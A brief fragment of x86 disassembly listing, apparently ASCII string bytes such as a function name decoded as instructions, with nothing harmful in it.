  420061:	inc    ebx
  420062:	ins    BYTE PTR es:[edi],dx
  420063:	outs   dx,DWORD PTR ds:[esi]
  420064:	jae    0x4200cb
  420066:	push   edi
  420067:	imul   eax,DWORD PTR [eax],0x0
	...
